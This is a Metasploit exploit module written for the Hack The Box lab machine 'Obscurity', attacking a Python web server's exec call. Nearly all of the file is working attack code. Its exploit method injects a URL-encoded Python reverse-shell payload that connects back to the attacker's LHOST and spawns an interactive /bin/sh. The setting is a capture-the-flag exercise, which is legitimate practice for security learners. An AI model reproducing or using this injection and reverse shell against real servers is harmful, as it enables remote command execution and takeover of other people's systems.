##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# Hack The Box
# Machine:      Obscurity
# Web server:   10.10.10.168:8080
# Source code:  http://10.10.10.160:8080/../SuperSecureServer.py
#
# Exploit:      Remote Command Execution (reverse shell)
#
# Author:       Matej Fabijanic <root4unix@gmail.com>
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => '[Hack The Box] [Machine: Obscurity - SuperSecureServer.py] [Python exec function] [RCE - reverse shell]',
			'Description'    => %q{
				Do a send_request_cgi()
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Matej Fabijanic' ],
            'Privileged'    => false,
            'Platform'      => %w{ linux },
            'Targets'       =>
                [
                    # Linux - TARGET = 0
                    [
                        'Automatic (Linux)',
                        {
                            'Arch'           => ARCH_X64,
                            'Platform'       => %w{ linux },
                            'DefaultOptions' => {'PAYLOAD' => 'linux/x64/shell_reverse_tcp'}
                        }
                    ]
                ],
            'DisclosureDate' => 'Dec 14 2019',
            'DefaultTarget'  => 0,
            'Notes'          => {
                'Stability'   => [CRASH_SAFE],
                'Reliability' => [REPEATABLE_SESSION],
                'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
            }
		))

		register_options( [
            Opt::RHOST('10.10.10.168'),
            Opt::RPORT(8080),
			OptString.new('TARGETURI', [true, 'The base path', '/']),
			OptString.new('LHOST', [true, 'Local IP address', '']),
			OptString.new('LPORT', [true, 'Local port', '4444'])
		], self.class)
	end


	def exploit
        lhost = datastore['LHOST']
        lport = datastore['LPORT']
		uri = target_uri.path
        url_resource = "';import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22" + lhost + "%22," + lport.to_s + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);'"

        print_status("Sending #{payload.encoded.length} byte payload...")
		res = send_request_cgi({
			'method'   => 'GET',
			'uri'      => normalize_uri(uri, url_resource)
		})
        print_status("sHelL...")
	end

end
